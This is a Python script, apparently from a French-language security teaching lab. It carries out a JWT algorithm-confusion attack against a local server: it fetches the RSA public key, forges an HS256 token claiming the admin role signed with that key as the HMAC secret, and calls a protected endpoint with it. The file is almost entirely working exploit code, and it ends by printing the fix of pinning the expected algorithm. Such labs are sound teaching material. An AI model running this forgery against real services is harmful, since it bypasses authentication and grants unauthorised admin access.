import json
import hmac
import hashlib
import base64
import math
import time
import requests

BASE_URL = "http://localhost:3000"


def b64url_encode(obj):
    return base64.urlsafe_b64encode(json.dumps(obj, separators=(",", ":")).encode()).rstrip(b"=").decode()


def b64url_encode_raw(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def banner(title):
    print("\n" + "-" * 60)
    print(" " + title)
    print("-" * 60)


def run():
    banner("ATTAQUE 2 : Confusion RS256 -> HS256")

    print("\n[1] Recuperation de la cle publique RSA (GET /api/public-key)...")
    key_res = requests.get(f"{BASE_URL}/api/public-key")
    if not key_res.ok:
        print("    Serveur inaccessible ou cles RSA non generees.")
        print("    -> python generate_keys.py  puis  python server.py")
        return
    rsa_public_key = key_res.text
    print(f"    Cle publique recuperee :\n")
    print(rsa_public_key)

    print("[2] Forge du token HS256 signe avec la cle publique comme secret HMAC...")

    forged_header = b64url_encode({"alg": "HS256", "typ": "JWT"})
    forged_payload = b64url_encode({
        "username": "attacker",
        "role": "admin",
        "iat": int(time.time()),
        "note": "token forge par confusion RS256/HS256",
    })

    signature = hmac.new(
        rsa_public_key.encode(),
        f"{forged_header}.{forged_payload}".encode(),
        hashlib.sha256,
    ).digest()

    forged_token = f"{forged_header}.{forged_payload}.{b64url_encode_raw(signature)}"

    print(f'\n    Payload forge : {json.dumps({"username": "attacker", "role": "admin", "note": "..."})}')
    print("    Secret HMAC utilise : cle publique RSA (connue de tous)")
    print(f"    Token forge : {forged_token[:80]}...")

    print("\n[3] Acces a /api/secret-rs256 avec le token forge...")
    secret_res = requests.get(
        f"{BASE_URL}/api/secret-rs256",
        headers={"Authorization": f"Bearer {forged_token}"},
    )
    secret_data = secret_res.json()

    if secret_res.ok:
        print("\nATTAQUE REUSSIE — acces obtenu sans cle privee RSA !")
        print(f"   Reponse : {json.dumps(secret_data, indent=2)}")
    else:
        print("\nAttaque echouee (serveur probablement durci).")
        print(f"   Reponse : {json.dumps(secret_data)}")

    banner("FIN DE L'ATTAQUE 2")
    print("\nCorrection : forcer l'algorithme attendu lors de la verification.")
    print('Exemple PyJWT :  jwt.decode(token, public_key, algorithms=["RS256"])\n')


if __name__ == "__main__":
    try:
        run()
    except requests.ConnectionError:
        print("\n[ERREUR] Impossible de contacter le serveur.")
        print("-> Assurez-vous que le serveur est lance : python server.py\n")
